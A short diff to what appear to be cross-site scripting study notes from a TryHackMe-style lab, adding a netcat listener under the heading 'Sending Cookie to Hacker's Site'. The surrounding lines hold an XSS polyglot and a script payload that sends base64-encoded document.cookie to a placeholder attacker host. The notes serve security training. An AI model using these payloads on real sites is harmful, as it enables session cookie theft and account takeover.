@@ -45,7 +45,10 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 ```javascript
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
-
+### Sending Cookie to Hacker's Site
+```bash
+nc -lvnp <port>
+```
 ```javascript
 </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
 ```
